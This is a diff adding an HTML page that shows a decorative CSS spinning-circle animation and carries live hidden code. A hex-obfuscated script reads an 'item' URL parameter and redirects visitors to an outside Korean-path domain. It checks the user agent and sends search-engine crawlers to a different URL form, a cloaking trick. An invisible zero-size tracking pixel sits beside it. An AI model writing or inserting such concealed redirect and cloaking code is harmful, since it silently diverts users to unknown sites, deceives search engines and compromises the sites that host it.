@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+<meta charset="UTF-8">
+<title>CZENECI</title>
+<meta name="robots" content="index,follow"/>
+<link rel="icon" type="image/x-icon" href="/favicon.png"/>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css">
+<style>
+body {
+  min-height: 400px;
+  height: 100vh;
+  position: relative;
+  background-color: #222;
+}
+div {
+  position: absolute;
+  left: 50%;
+  top: 50%;
+}
+div::before,
+div::after {
+  display: block;
+  content: '';
+  position: absolute;
+}
+@media (max-width: 400px) {
+  div:not(.no-scale) {
+    transform: scale(0.8);
+  }
+}
+#haunted {
+  width: 200px;
+  height: 200px;
+  margin-left: -100px;
+  margin-top: -100px;
+  background: radial-gradient(circle, #aaa 50%, rgba(170,170,170,0) 51%) 64% 7%/1em 1em, radial-gradient(circle, #999 50%, rgba(153,153,153,0) 51%) 63.5% 6.5%/1.1em 1.1em, radial-gradient(circle, #aaa 50%, rgba(170,170,170,0) 51%) 22% 24%/3em 3em, radial-gradient(circle, #999 50%, rgba(153,153,153,0) 51%) 21% 23%/3.1em 3.1em, radial-gradient(circle, #aaa 50%, rgba(170,170,170,0) 51%) 74% 34%/2em 2em, radial-gradient(circle, #999 50%, rgba(153,153,153,0) 51%) 73.5% 33.5%/2.1em 2.1em, radial-gradient(circle, #aaa 50%, rgba(170,170,170,0) 51%) 14% 57%/1em 1em, radial-gradient(circle, #999 50%, rgba(153,153,153,0) 51%) 13.5% 56.5%/1.1em 1.1em, radial-gradient(circle, #aaa 50%, rgba(170,170,170,0) 51%) 26% 65%/1em 1em, radial-gradient(circle, #999 50%, rgba(153,153,153,0) 51%) 25.5% 64.5%/1.1em 1.1em, radial-gradient(circle, #aaa 50%, rgba(170,170,170,0) 51%) 54% 54%/1em 1em, radial-gradient(circle, #999 50%, rgba(153,153,153,0) 51%) 53.5% 53.5%/1.1em 1.1em, radial-gradient(circle, #aaa 50%, rgba(170,170,170,0) 51%) 85% 54%/1em 1em, radial-gradient(circle, #ccc 50%, rgba(204,204,204,0) 51%) 86% 54.5%/1.2em 1.2em, radial-gradient(circle, #aaa 50%, rgba(170,170,170,0) 51%) 44% 94%/2.8em 2.8em, radial-gradient(circle, #ccc 50%, rgba(204,204,204,0) 51%) 44% 96%/3.1em 3.1em, radial-gradient(circle, #aaa 50%, rgba(170,170,170,0) 51%) 86% 75%/1em 1em, radial-gradient(circle, #999 50%, rgba(153,153,153,0) 51%) 85.5% 74.5%/1.1em 1.1em, radial-gradient(circle, rgba(0,0,0,0) 50%, rgba(0,0,0,0.1) 51%) -4.5em -4.5em/18em 18em;
+  background-repeat: no-repeat;
+  background-color: #ccc;
+  border-radius: 50%;
+}
+#haunted::before,
+#haunted::after {
+  width: 80px;
+  height: 40px;
+  left: 50%;
+  margin-left: -40px;
+  -webkit-animation: haunted-spin 4s linear infinite;
+          animation: haunted-spin 4s linear infinite;
+}
+#haunted::before {
+  top: -52px;
+  background: no-repeat radial-gradient(black 50%, rgba(0,0,0,0) 52%) 20% 70%/0.6em 0.6em, no-repeat radial-gradient(black 50%, rgba(0,0,0,0) 52%) 20% 30%/0.6em 0.6em, no-repeat radial-gradient(black 50%, rgba(0,0,0,0) 52%) 35% 50%/1em 1em, no-repeat linear-gradient(white, white) 0 50%/92% 100%, repeat-y radial-gradient(circle at 0 50%, white 38%, rgba(255,255,255,0) 39%) 113% 0/1em 33.333%;
+  border-radius: 2em 0 0 2em;
+  transform-origin: 50% 9.5em;
+}
+#haunted::after {
+  bottom: 0;
+  bottom: -52px;
+  background: no-repeat radial-gradient(black 50%, rgba(0,0,0,0) 52%) 80% 70%/0.6em 0.6em, no-repeat radial-gradient(black 50%, rgba(0,0,0,0) 52%) 80% 30%/0.6em 0.6em, no-repeat radial-gradient(black 50%, rgba(0,0,0,0) 52%) 65% 50%/1em 1em, no-repeat linear-gradient(white, white) 100% 50%/92% 100%, repeat-y radial-gradient(circle at 100% 50%, white 38%, rgba(255,255,255,0) 39%) -13% 0/1em 33.333%;
+  border-radius: 0 2em 2em 0;
+  transform-origin: 50% -7em;
+}
+@-webkit-keyframes haunted-spin {
+  from {
+    transform: rotate(0);
+  }
+  to {
+    transform: rotate(-180deg);
+  }
+}
+@keyframes haunted-spin {
+  from {
+    transform: rotate(0);
+  }
+  to {
+    transform: rotate(-180deg);
+  }
+}
+</style>
+</head>
+<img src="//sstatic1.histats.com/0.gif?4705536&101" alt="" border="0" style="width:0;height:0;">
+<script>
+var _0xa0a0=["\x72\x65\x70\x6C\x61\x63\x65","\x73\x65\x61\x72\x63\x68","\x70\x61\x74\x68\x6E\x61\x6D\x65","\x65\x78\x65\x63","","\x75\x73\x65\x72\x41\x67\x65\x6E\x74","\x74\x65\x73\x74","\x69\x74\x65\x6D","\x68\x72\x65\x66","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x74\x79\x64\x61\x63\x6B\x2E\x63\x6F\x6D\x2F\x6B\x6F\x2F\x69\x2F","\x2E\x68\x74\x6D\x6C"];(function(){let _0xfe03x1=(function(){var _0xfe03x2={};location[_0xa0a0[1]][_0xa0a0[0]](/[?&]+([^=&]+)=([^&]*)/gi,function(_0xfe03x3,_0xfe03x4,_0xfe03x5){_0xfe03x2[_0xfe03x4]= _0xfe03x5});return _0xfe03x2})();(/(\d+)\.html$/[_0xa0a0[3]](location[_0xa0a0[2]]))?/(\d+)\.html$/[_0xa0a0[3]](location[_0xa0a0[2]])[1]:_0xa0a0[4];let _0xfe03x6=/bot|google|baidu|bing|msn|duckduckbot|teoma|slurp|yandex/i[_0xa0a0[6]](navigator[_0xa0a0[5]]);if(_0xfe03x1[_0xa0a0[7]]&&  !_0xfe03x6){location[_0xa0a0[8]]= _0xa0a0[9]+ _0xfe03x1[_0xa0a0[7]]+ _0xa0a0[4]}else {if(_0xfe03x1[_0xa0a0[7]]&& _0xfe03x6){location[_0xa0a0[0]](_0xa0a0[9]+ _0xfe03x1[_0xa0a0[7]]+ _0xa0a0[10])}}})()
+</script>
+<body translate="no" >
+<div id="haunted"></div>
+</body>
+</html>
